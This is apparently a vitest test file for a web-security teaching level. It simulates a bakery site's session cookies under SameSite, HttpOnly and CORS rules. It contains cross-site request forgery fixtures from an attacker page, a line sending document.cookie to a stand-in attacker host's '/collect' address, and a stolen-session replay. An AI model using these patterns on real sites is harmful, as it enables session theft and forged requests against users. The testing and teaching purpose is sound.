import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
import type { WebSpec } from '../../../../shared/levels/web/backend'
import { nodeBackend } from './helpers'

// The web backend's cookies (ADR 0009 chapter 2, docs/features/levels.md "The web backend"): the very source the bridge
// runs in the sealed frame, here on Node with server.js in-process and fake timers. The jar between the page, other
// sites and server.js: what server.js sets (and Chrome refuses), what each request carries with chapter 1's credentials
// rules, another site's page run as Lena's browser runs it, document.cookie, and what the Application panel gets.

const API = 'https://api.cornerbakery.shop'
const ATTACKER = 'https://cheap-flour.example'
const MAIL = 'https://mail.example'

const SERVER = `const express = require('express')
const app = express()
app.use(express.urlencoded())
const SHOP = 'https://cornerbakery.shop'
const orders = []
app.use((req, res, next) => {
  if (req.get('Origin') === SHOP) {
    res.set('Access-Control-Allow-Origin', SHOP)
    res.set('Access-Control-Allow-Credentials', 'true')
  }
  next()
})
app.post('/login', (req, res) => {
  res.cookie('session', 'lena-7f3a', SESSION_OPTIONS)
  res.json({ name: 'Lena' })
})
app.post('/orders', (req, res) => {
  if (!(req.get('Cookie') ?? '').includes('session=lena-7f3a')) return res.status(401).send('Please sign in')
  orders.push(req.body)
  res.status(201).json({ orders: orders.length })
})
app.get('/pickup/1042', (req, res) => {
  if (!(req.get('Cookie') ?? '').includes('session=')) return res.status(401).send('<h1>Please sign in</h1>')
  res.send('<h1>Order 1042</h1>')
})
`

const SPEC: WebSpec = {
  api: API,
  server: 'server.js',
  application: true,
  sites: [
    { origin: ATTACKER, title: 'Cheap Flour', role: 'attacker', intro: [], actions: [{ img: `${API}/pickup/1042` }, { fetch: `${API}/orders`, method: 'POST', credentials: 'include', mode: 'no-cors', body: { item: 'rye' } }, { form: `${API}/orders`, method: 'POST', fields: { item: 'sourdough', quantity: '40' } }] },
    { origin: MAIL, title: 'Mail', role: 'mail', intro: [], actions: [{ link: `${API}/pickup/1042`, text: 'Your order' }] },
    { origin: 'https://deals.example', title: 'Deals', role: 'attacker', intro: [], noReferrer: true, hidden: true, actions: [{ form: `${API}/orders`, method: 'POST', fields: { item: 'rye' } }] }
  ]
}

type Made = ReturnType<typeof nodeBackend>
const begin = (sessionOptions: string) => nodeBackend(SPEC, { 'server.js': SERVER.replace('SESSION_OPTIONS', sessionOptions), 'index.html': '' })

async function settle<T>(promise: Promise<T>): Promise<{ ok: true, value: T } | { ok: false, error: unknown }> {
  const outcome = promise.then(value => ({ ok: true as const, value }), (error: unknown) => ({ ok: false as const, error }))
  await vi.advanceTimersByTimeAsync(2000)
  return outcome
}
async function signIn(made: Made) {
  const outcome = await settle(made.backend.fetch(`${API}/login`, { method: 'POST', credentials: 'include', body: new URLSearchParams({ email: 'lena@example.com' }) }))
  if (!outcome.ok) throw outcome.error
  return outcome.value
}
function visit(made: Made, origin: string) {
  const done = new Promise<unknown>(resolve => made.backend.visit(origin, resolve))
  void vi.advanceTimersByTimeAsync(2000)
  return done
}
const fromSite = (made: Made, origin: string) => made.of('request').filter(message => message.site === origin) as unknown as { method: string, destination: string, headers: [string, string][], body: string | null, cookies: { name: string, sent: boolean, reason: string | null }[] }[]

beforeEach(() => {
  vi.useFakeTimers()
})
afterEach(() => {
  vi.useRealTimers()
})

describe('what server.js sets', () => {
  it('stores it for a credentialed request, never shows the page Set-Cookie, and lists it for the Application panel', async () => {
    const made = begin('{ httpOnly: true, secure: true, sameSite: \'lax\' }')
    const response = await signIn(made)
    expect(response.headers.get('set-cookie')).toBeNull()
    expect(made.of('response').at(-1)!.cookies).toEqual([{ line: 'session=lena-7f3a; Path=/; HttpOnly; Secure; SameSite=Lax', stored: true, reason: null }])
    await vi.advanceTimersByTimeAsync(100)
    expect(made.of('cookies').at(-1)).toMatchObject({ total: 1, refused: [], readable: [], jar: [{ name: 'session', value: 'lena-7f3a', domain: 'api.cornerbakery.shop', hostOnly: true, path: '/', expires: null, httpOnly: true, secure: true, sameSite: 'Lax', size: 16 }] })
    // HttpOnly: document.cookie on the page sees nothing of it
    expect(made.backend.documentCookie()).toBe('')
  })

  it('is refused when SameSite=None comes without Secure, in Chrome\'s words', async () => {
    const made = begin('{ httpOnly: true, sameSite: \'none\' }')
    await signIn(made)
    expect(made.of('response').at(-1)!.cookies).toEqual([{ line: 'session=lena-7f3a; Path=/; HttpOnly; SameSite=None', stored: false, reason: 'This attempt to set a cookie via a "Set-Cookie" header was blocked because it had the "SameSite=None" attribute but didn’t have the "Secure" attribute, which is required in order to use "SameSite=None"' }])
    await vi.advanceTimersByTimeAsync(100)
    expect(made.of('cookies').at(-1)).toMatchObject({ total: 0, refused: [{ source: 'set', name: 'session', url: `${API}/login` }] })
  })

  it('is not kept from an answer to a request without credentials (and says so), but is kept from an answer CORS refuses', async () => {
    const made = begin('{ secure: true }')
    await settle(made.backend.fetch(`${API}/login`, { method: 'POST' }))
    expect(made.of('response').at(-1)!.cookies[0]).toMatchObject({ stored: false, reason: expect.stringMatching(/^Not stored: the request went without credentials/) })
    // Fetch sets cookies in "HTTP-network fetch", before the CORS check: a refused answer's cookie is in the jar
    const other = nodeBackend({ api: API, server: 'server.js' }, { 'server.js': 'const app = require(\'express\')()\napp.get(\'/x\', (req, res) => { res.cookie(\'a\', \'1\', { secure: true }); res.end() })' })
    expect((await settle(other.backend.fetch(`${API}/x`, { credentials: 'include' }))).ok).toBe(false)
    expect(other.of('response').at(-1)).toMatchObject({ failure: 'cors', cookies: [{ stored: true }] })
    await settle(other.backend.fetch(`${API}/x`, { credentials: 'include' }))
    expect(other.of('request').at(-1)!.headers).toContainEqual(['cookie', 'a=1'])
  })
})

describe('another site\'s page', () => {
  it('runs its image, fetch and form as Lena\'s browser sends them, tagged with the site', async () => {
    const made = begin('{ httpOnly: true, secure: true, sameSite: \'none\' }')
    await signIn(made)
    expect(await visit(made, ATTACKER)).toBe(201)
    const rows = fromSite(made, ATTACKER)
    expect(rows.map(message => [message.method, message.destination])).toEqual([['GET', 'image'], ['POST', 'fetch'], ['POST', 'document']])
    // SameSite=None: every one carries Lena's session, so both orders went through
    expect(rows.every(message => message.headers.some(([name, value]) => name === 'cookie' && value === 'session=lena-7f3a'))).toBe(true)
    expect(made.server.output.filter(line => line.level === 'access').map(line => line.text)).toEqual(['POST /login 200', 'GET /pickup/1042 200', 'POST /orders 201', 'POST /orders 201'])
    // the form's navigation: its Origin and the Referer of its page (the origin only, another origin's)
    expect(rows[2]!.headers).toEqual([['content-type', 'application/x-www-form-urlencoded'], ['origin', ATTACKER], ['referer', `${ATTACKER}/`], ['cookie', 'session=lena-7f3a']])
    expect(rows[2]!.body).toBe('item=sourdough&quantity=40')
    expect(made.backend.carried(`POST ${API}/orders`, 'session')).toBe(2)
  })

  it('gets nothing of a SameSite=Lax session from an image, a fetch or a form; a link Lena follows carries it', async () => {
    const made = begin('{ httpOnly: true, secure: true, sameSite: \'lax\' }')
    await signIn(made)
    expect(await visit(made, ATTACKER)).toBe(401)
    expect(fromSite(made, ATTACKER).at(-1)!.cookies).toEqual([{ name: 'session', value: 'lena-7f3a', sent: false, reason: 'This cookie was blocked because it had the "SameSite=Lax" attribute and the request was made from a different site and wasn’t initiated by a top-level navigation' }])
    expect(await visit(made, MAIL)).toBe(200)
    expect(made.backend.carried(`GET ${API}/pickup/1042`, 'session')).toBe(1)
  })

  it('gets a session set without SameSite a moment ago with its form (Chrome\'s Lax+POST); Strict keeps it from a link too', async () => {
    const unset = begin('{ httpOnly: true, secure: true }')
    await signIn(unset)
    expect(await visit(unset, ATTACKER)).toBe(201)
    expect(fromSite(unset, ATTACKER).at(-1)!.cookies[0]).toMatchObject({ sent: true, reason: expect.stringMatching(/^Sent anyway: it has no SameSite attribute and was set less than 2 minutes ago/) })
    const strict = begin('{ httpOnly: true, secure: true, sameSite: \'strict\' }')
    await signIn(strict)
    expect(await visit(strict, MAIL)).toBe(401)
    expect(fromSite(strict, MAIL).at(-1)!.cookies[0]!.reason).toMatch(/"SameSite=Strict" attribute and the request was made from a different site\. This includes top-level navigation/)
  })

  it('sends no Referer and Origin: null from a no-referrer page', async () => {
    const made = begin('{ secure: true, sameSite: \'none\' }')
    await signIn(made)
    await visit(made, 'https://deals.example')
    expect(made.of('request').at(-1)!.headers).toEqual([['content-type', 'application/x-www-form-urlencoded'], ['origin', 'null'], ['cookie', 'session=lena-7f3a']])
  })
})

describe('the probes and document.cookie', () => {
  it('navigate without a word in the panels, with or without Lena\'s cookies; find a leak to another site', async () => {
    const made = begin('{ secure: true, sameSite: \'none\' }')
    await signIn(made)
    const shown = made.of('request').length
    const status = (probe: { navigate: string, from: string, credentials?: string }) => {
      const done = new Promise(resolve => made.backend.navigate(probe, resolve))
      void vi.advanceTimersByTimeAsync(2000)
      return done
    }
    expect(await status({ navigate: `GET ${API}/pickup/1042`, from: MAIL })).toBe(200)
    expect(await status({ navigate: `GET ${API}/pickup/1042`, from: MAIL, credentials: 'omit' })).toBe(401)
    expect(made.of('request')).toHaveLength(shown)
    // the page's document.cookie (no HttpOnly here), sent to the attacker's server in an address
    expect(made.backend.documentCookie()).toBe('')
    expect(made.backend.readable('session')).toBe(0)
    made.backend.writeCookie('note=lena-7f3a-copy')
    await settle(made.backend.fetch(`${ATTACKER}/collect?c=${encodeURIComponent(made.backend.documentCookie())}`, { mode: 'no-cors' }))
    expect(made.backend.leaked('lena-7f3a')).toBe(1)
    expect(made.backend.leaked('nothing-like-it')).toBe(0)
  })

  it('replays what a script on the page can read as an attacker would: HttpOnly keeps the session out of it', async () => {
    const stolen = async (made: Made) => {
      const done = new Promise(resolve => made.backend.stolen(`POST ${API}/orders`, resolve))
      await vi.advanceTimersByTimeAsync(2000)
      return done
    }
    const readable = begin('{ secure: true, sameSite: \'lax\', domain: \'cornerbakery.shop\' }')
    await signIn(readable)
    // the page's script read session=lena-7f3a; from the attacker's machine it is Lena's session
    expect(await stolen(readable)).toBe(201)
    const hidden = begin('{ httpOnly: true, secure: true, sameSite: \'lax\', domain: \'cornerbakery.shop\' }')
    await signIn(hidden)
    expect(await stolen(hidden)).toBe(401)
  })

  it('writes document.cookie through the rules (no HttpOnly, no other site\'s Domain), lists what it refused, and posts a flood once', async () => {
    const made = begin('{ secure: true }')
    made.backend.writeCookie('theme=dark')
    made.backend.writeCookie('session=forged; HttpOnly')
    made.backend.writeCookie('wide=1; Domain=cheap-flour.example')
    expect(made.backend.documentCookie()).toBe('theme=dark')
    expect(made.backend.readable('theme')).toBe(1)
    await vi.advanceTimersByTimeAsync(100)
    expect(made.of('cookies').at(-1)).toMatchObject({ readable: ['theme'], refused: [{ source: 'script', name: 'session', reason: expect.stringMatching(/^document\.cookie can't set an HttpOnly cookie/) }, { source: 'script', name: 'wide' }] })
    // a loop of writes makes one message for the panel, not one per write; Chrome's cap per site keeps 180 at most
    const before = made.of('cookies').length
    for (let i = 0; i < 500; i++) made.backend.writeCookie(`n${i}=1`)
    await vi.advanceTimersByTimeAsync(200)
    expect(made.of('cookies').length - before).toBe(1)
    expect(made.of('cookies').at(-1)!.total).toBeLessThanOrEqual(180)
  })
})
